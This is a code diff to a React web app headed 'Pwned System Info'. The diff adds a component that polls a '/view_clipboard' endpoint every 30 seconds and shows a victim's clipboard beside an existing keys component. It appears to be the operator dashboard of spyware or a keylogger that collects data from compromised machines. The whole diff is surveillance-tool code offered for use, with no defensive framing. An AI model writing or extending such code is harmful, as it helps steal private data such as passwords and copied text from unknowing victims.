@@ -2,6 +2,41 @@ import React, {useState, useEffect} from 'react'
 import "./App.css"
 
 
+function FetchClipboard(){
+  const [data, setData] = useState([])
+
+  useEffect(() => {
+    const fetchData = () => {fetch("/view_clipboard").then(
+      res => res.text()
+    ).then(
+      data => {
+        setData(data)
+      }
+    )}
+
+    fetchData();
+
+    // Set up an interval to fetch data every 30 seconds
+    const intervalId = setInterval(fetchData, 30000);
+
+    // Cleanup the interval on component unmount
+    return () => clearInterval(intervalId);
+
+  }, [])
+
+  let clipboard = data
+
+
+  return (
+    <>
+      <h1>
+        Clipboard
+      </h1>
+      <p>The clipboard of user is: {clipboard}</p>
+    </>
+  )
+}
+
 function FetchKeys(){
   const [data, setData] = useState([{}])
 
@@ -64,6 +99,7 @@ export default function App(){
         <h1>Pwned System Info</h1>
         <ul>{sys_info}</ul>
         <FetchKeys />
+        <FetchClipboard />
       </>
     ) 
 
